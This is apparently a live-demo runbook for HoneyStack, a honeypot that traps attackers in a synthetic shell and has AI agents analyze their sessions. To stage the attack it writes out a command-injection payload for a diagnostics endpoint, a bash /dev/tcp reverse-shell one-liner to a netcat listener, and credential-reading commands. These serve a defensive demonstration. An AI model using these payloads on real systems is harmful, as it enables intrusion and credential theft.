# Live demo runbook

Every command to run and every line to say, in order. The spoken lines follow [`demo-script-2m40.md`](demo-script-2m40.md) (2 min 40 s). The longer attacker monologue is in [`attacker-story.md`](attacker-story.md) if you want more color.

**Layout on screen:** browser on the left (Hivewell `/status`, then the Shield dashboard), terminal on the right split in two panes: **Pane A = listener**, **Pane B = attacker**.

---

## Part 1: Pre-flight (30 minutes before)

### 1. Start the three services on the demo laptop
Run each in its own terminal tab, from the repo root, and leave them running. Keep the laptop plugged in and awake (`caffeinate -dims` in a spare tab).

If Claude Code already started these for you in a session that's still open, skip them. Port `8080` and ngrok's `4040` will be busy, and a second copy will fail.

- [ ] **Control server** (shell brain, Guild, ClickHouse, dashboard):
  ```sh
  NODE_ENV=production npm run dev:control
  ```
  Check: `curl -s localhost:8080/health` → `{"ok":true,"clickhouse":true}`
- [ ] **Cloudflare tunnel** (how the Akash trap reaches the control server):
  ```sh
  cloudflared tunnel --url http://127.0.0.1:8080
  ```
  Copy the `https://….trycloudflare.com` URL it prints.
- [ ] **ngrok** (how the reverse shell reaches your listener):
  ```sh
  ngrok tcp 4444
  ```
  Get its address any time with `curl -s localhost:4040/api/tunnels | grep -o 'tcp://[^"]*'`. If the host is unchanged and its IPs still include `CALLBACK_ALLOWLIST`, only `LPORT` changes and no redeploy is needed.
  Note the `tcp://X.tcp.….ngrok.io:PORT` address, then get one of its IPs:
  ```sh
  dig +short A X.tcp.us-cal-1.ngrok.io | head -1
  ```

### 2. Make sure the deployed trap points at them
- [ ] GitHub → **Settings → Secrets and variables → Actions → Variables**:
  - `CONTROL_URL` = the trycloudflare URL from step 1
  - `CALLBACK_ALLOWLIST` = the ngrok IP from step 1
- [ ] If either value **changed** (it does whenever cloudflared or ngrok restart), go to **Actions → CD — build & deploy to Akash → Run workflow** and wait for it to go green.
- [ ] Open the green run's **Summary** and copy the **Service URI**. That's `T` below.

Last known values (re-check, they change on restart):

| Value | Last known |
|---|---|
| `CONTROL_URL` | `https://characteristics-insurance-disciplines-ppm.trycloudflare.com` |
| ngrok address | `8.tcp.us-cal-1.ngrok.io:15659` (the port changes every time ngrok restarts) |
| `CALLBACK_ALLOWLIST` / `LHOST` | `52.52.159.144` |
| `LPORT` | `15659` |

### 3. Set up the attacker terminal (Pane B)
Paste once, with your real values:
```sh
export T=http://<Service URI from the CD summary>
export TOKEN=hw_admin_5f2c9e1a7b3d4c86
export LHOST=52.52.159.144      # ngrok IP (must equal CALLBACK_ALLOWLIST)
export LPORT=15659              # ngrok port (changes when ngrok restarts; not a GitHub value)
```
Preload the three long commands into history so you can recall them with the up arrow instead of typing (zsh; `-r` keeps the escaped quotes intact):
```sh
print -rs "curl -s \$T/api/env"
print -rs "curl -s -X POST \$T/api/admin/diagnostics -H \"authorization: Bearer \$TOKEN\" -H 'content-type: application/json' -d '{\"host\":\"8.8.8.8; id\"}'"
print -rs "curl -s -X POST \$T/api/admin/diagnostics -H \"authorization: Bearer \$TOKEN\" -H 'content-type: application/json' -d \"{\\\"host\\\":\\\"x; bash -c 'bash -i >& /dev/tcp/\$LHOST/\$LPORT 0>&1'\\\"}\""
```

### 4. Smoke test (2 minutes)
- [ ] `curl -s $T/health` → `{"status":"ok"}`
- [ ] `curl -s $T/ | grep -o '<title>[^<]*'` → `Hivewell — Know your hive…` (not "Acme Status")
- [ ] `curl -s $T/api/env` → JSON with `ADMIN_TOKEN`. A `503 capture unavailable` means the trap can't reach your control server: re-check `CONTROL_URL` and the tunnel.
- [ ] Dashboard shows that request as a new session within 5 s.

Optional full dry run: do Part 2 steps 3–6 once, then `exit`. Keep that session: if the live **Analyze** is slow on stage, click this one instead (step 9 fallback).

### 5. Open the browser tabs
- [ ] **Tab 1:** `$T/status` (the Hivewell internal dashboard the attacker "found")
- [ ] **Tab 2:** `http://127.0.0.1:8080/admin/plugins/honeystack`, signed in with `CONTROL_TOKEN` from `.env` (`grep CONTROL_TOKEN .env`)
- [ ] Zoom browser to 110–125%, large terminal font, `clear` both panes.

### 6. Start the listener (Pane A), right before you go on
```sh
nc -lv 4444          # macOS (BSD nc)
# nc -lvnp 4444      # Linux / GNU or OpenBSD nc
```
macOS `nc` rejects `-p` together with `-l`, so use the first form on a Mac. It waits silently until the trap connects.

---

## Part 2: Live (2:40)

Each step: **Do** = what you click/type · **Say** = your line · **Expect** = what appears.

### 0:00 — Hook  ·  Tab 1 (`/status`) + both panes visible

- [ ] **1. Say:**
  > Most honeypots tell you somebody knocked. HoneyStack lets the attacker walk in, and quietly replaces the building around them.
  >
  > This is the admin portal for Hivewell Status. An attacker finds a leaked admin token, discovers a vulnerable diagnostics tool, and uses it to launch a reverse shell. Their terminal connects, and they believe they own our server.
  >
  > But nothing they type is ever executed. We place them inside a completely synthetic machine, keep them exploring, and record every move they make. Let's watch it happen.

### 0:38 — Attack  ·  Pane B

- [ ] **2. Do (Pane B):** `curl -s $T/api/env`
  **Expect:** `{"NODE_ENV":"production","DATABASE_URL":"postgres://hivewell_app:…","ADMIN_TOKEN":"hw_admin_5f2c9e1a7b3d4c86"}`
  **Say:**
  > The attacker checks the environment endpoint and finds an exposed admin token.

- [ ] **3. Do (Pane B):** the `8.8.8.8; id` diagnostics command (up arrow)
  **Expect:** `PING 8.8.8.8 (8.8.8.8)…` then `uid=1000(node) gid=1000(node) groups=1000(node)`
  **Say:**
  > They use that token on the diagnostics endpoint and inject `id`. The response says `uid=1000(node)`. To the attacker, that confirms remote code execution.

- [ ] **4. Do (Pane B):** the reverse-shell command (up arrow). It will hang, which is normal.
  **Expect (Pane A):** (Linux nc prints `Connection received…` first; macOS nc stays quiet) then
  ```
  bash: cannot set terminal process group (1): Inappropriate ioctl for device
  bash: no job control in this shell
  node@hivewell-status-7f9c4:/app$
  ```
  **Say:**
  > Now they launch a reverse shell. Watch the listener: connection received, followed by a believable bash prompt. This is a real TCP callback, which makes the compromise feel genuine.

- [ ] **5. Do (Pane A, inside the shell):**
  ```sh
  whoami
  cat .env.production
  cat ~/.aws/credentials
  ```
  **Expect:** `node`, the fake `.env.production` (database password, JWT secret, S3 bucket), the fake AWS keys. Each answers in under a second.
  **Say:**
  > They begin hunting for credentials. Every secret and every file they see is synthetic, but the fake machine remains consistent. Meanwhile, HoneyStack captures every command and response.

- [ ] **5b. Optional, if you're ahead on time (Pane A):** `find / -perm -4000 2>/dev/null`
  This one is answered by the **Guild** shell agent, so the dashboard shows a GUILD badge. It can take 5–40 s; keep talking.

- [ ] **6. Do (Pane A):** `exit`

### 1:18 — Reveal  ·  Tab 2 (Shield)

- [ ] **7. Do:** switch to the Shield tab. Click the newest session in **Attack sessions** if it isn't already selected.
  **Expect:** stage **Post-exploitation**, the attack path strip lit through **Reverse shell**, the **Terminal replay** with your commands (FAST badges), **Time wasted**.
  **Say:**
  > Hivewell's site has HoneyStack Shield installed. The attacker thought they broke in. Here's what Shield saw.
  >
  > We can watch the complete attack path, replay their terminal command by command, see how each response was generated, and measure how long we kept them occupied.

- [ ] **8. Do:** click **Analyze with Guild**.
  **Expect:** "analysis in progress", then within ~20–60 s the **Evidence report**: SUSPICIOUS SEQUENCE, a summary, and the **Kill chain**.
  **Say (while it runs):**
  > With one click, Guild turns the raw session into an evidence-linked attack report:

- [ ] **9. Do:** when the report appears, click the **Credential hunting** stage.
  **Expect:** the matching replay turns (`cat .env.production`, `cat ~/.aws/credentials`) light up.
  **Say:**
  > …initial access, command injection, credential hunting, and every command that proves it.

  **Fallback:** if the report hasn't appeared after ~30 s, click the dry-run session from pre-flight (already analyzed) and say "here's one we analyzed a moment ago."

### 1:48 — Sponsors  ·  stay on Shield (or show `assets/architecture.svg`)

- [ ] **10. Say:**
  > Akash hosts our public-facing trap, giving the attacker a real network endpoint and allowing the reverse-shell callback to originate from the deployed environment. The trap remains isolated and contains no real credentials.
  >
  > ClickHouse is our telemetry backbone. It stores the HTTP events, shell commands, outputs, timing, and response sources, then powers the live replay and time-wasted metrics you see here.
  >
  > Guild provides the intelligence layer. A Guild-powered shell agent can handle unfamiliar commands while remaining inside the synthetic world, and a separate analyst agent converts the completed session into an evidence-backed attacker playbook.

### 2:29 — Close

- [ ] **11. Say:**
  > HoneyStack turns an attempted breach into defense intelligence. Every byte the attacker saw was invented, but every move they made became real evidence.

---

## If something goes wrong

| Symptom | Cause | Fix on the spot |
|---|---|---|
| `curl $T/api/env` → `503 capture unavailable` | Trap can't reach the control server | Check the control server and cloudflared are running; `CONTROL_URL` in GitHub must match the current tunnel URL (redeploy if not) |
| Reverse shell: nothing in Pane A | ngrok not running, IP not allowlisted, or the payload used the wrong port | `ngrok tcp 4444` running? `$LHOST` must equal `CALLBACK_ALLOWLIST`; `$LPORT` must be ngrok's port; `nc -lv 4444` must be running (macOS) |
| Shell shows `bash: fork: retry: Resource temporarily unavailable` | A command took longer than 90 s | Just type the next command; stick to the fast commands in step 5 |
| A command hangs 15–20 s (`sudo /usr/local/bin/backup.sh`, `psql`, `wget`) | Intentional: those are time sinks | Keep talking: "the attacker is now waiting on a database that doesn't exist" |
| Analyze stays "in progress" | Guild API slow | Use the pre-analyzed dry-run session (step 9 fallback) |
| Dashboard shows "Operator sign-in required" | Cookie expired | Sign in again with `CONTROL_TOKEN` from `.env` |

## After the demo
- [ ] Stop the listener, ngrok, cloudflared, and the control server.
- [ ] Close the Akash deployment (`sh scripts/close-deployment.sh <DSEQ>`).
- [ ] Rotate `INGEST_TOKEN`, `CONTROL_TOKEN`, the Guild trigger keys, the Anthropic key, and the ngrok authtoken (they were shared in chat during the build).
